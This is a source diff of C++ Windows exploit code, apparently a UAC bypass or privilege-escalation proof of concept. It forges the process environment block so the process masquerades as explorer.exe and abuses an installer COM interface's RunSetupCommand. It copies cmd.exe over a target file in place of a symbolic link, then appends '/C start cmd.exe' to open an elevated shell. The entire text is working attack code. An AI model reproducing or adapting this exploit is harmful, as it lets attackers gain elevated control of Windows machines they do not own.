@@ -101,8 +101,8 @@ struct LDR_CALLBACK_PARAMS
 void ForgeProcessInformation(const PCWCHAR explorerPath, const RtlInitUnicodeStringPtr RtlInitUnicodeString,
 	const LdrEnumerateLoadedModulesPtr LdrEnumerateLoadedModules)
 {
-	const auto pPeb = *reinterpret_cast<PBYTE*>(reinterpret_cast<PBYTE>(NtCurrentTeb()) + PEB_OFFSET);
-	auto pProcessParams = *reinterpret_cast<PRTL_USER_PROCESS_PARAMETERS*>(pPeb + PROCESS_PARAM_OFFSET);
+	auto* const pPeb = *reinterpret_cast<PBYTE*>(reinterpret_cast<PBYTE>(NtCurrentTeb()) + PEB_OFFSET);
+	auto* pProcessParams = *reinterpret_cast<PRTL_USER_PROCESS_PARAMETERS*>(pPeb + PROCESS_PARAM_OFFSET);
 
 	RtlInitUnicodeString(&pProcessParams->ImagePathName, explorerPath);
 	RtlInitUnicodeString(&pProcessParams->CommandLine, L"explorer.exe");
@@ -280,7 +280,8 @@ int main()
 		return EXIT_FAILURE;
 	}
 
-	BSTR fileName = SysAllocString(system32.c_str()), targetFile;
+	const auto fileName = SysAllocString(system32.c_str());
+	BSTR targetFile;
 	ULONG unknown5;
 	PUCHAR unknown6;
 
@@ -313,9 +314,9 @@ int main()
 
 	system32 = system32.substr(0, system32.find(L"\\bdeunlock.exe"));
 	system32 += L"\\cmd.exe";
-	if (!CreateSymbolicLinkW(file, system32.c_str(), SYMBOLIC_LINK_FLAG_ALLOW_UNPRIVILEGED_CREATE))
+	if (!CopyFileW(system32.c_str(), file, FALSE))
 	{
-		std::wcout << L"CreateSymbolicLinkW() failed. Error: " << GetLastError() << std::endl;
+		std::wcout<< L"CopyFileW() failed. Error: " << GetLastError() << std::endl;
 		SysFreeString(targetFile);
 		SysFreeString(instanceUuid);
 		installer2->Release();
@@ -427,6 +428,11 @@ int main()
 	system32 = system32.substr(0, system32.find(L"\\cmd.exe"));
 	const auto workingDirectory = SysAllocString(system32.c_str());
 
+	std::wstring commandLine{ targetFile };
+	commandLine += L" /C start cmd.exe";
+	SysFreeString(targetFile);
+	targetFile = SysAllocString(commandLine.c_str());
+	
 	HANDLE exeHandle;
 	hr = installer2->RunSetupCommand(instanceUuid, nullptr, targetFile, const_cast<BSTR>(L""), workingDirectory,
 	                                 const_cast<BSTR>(L""), 0, &exeHandle);
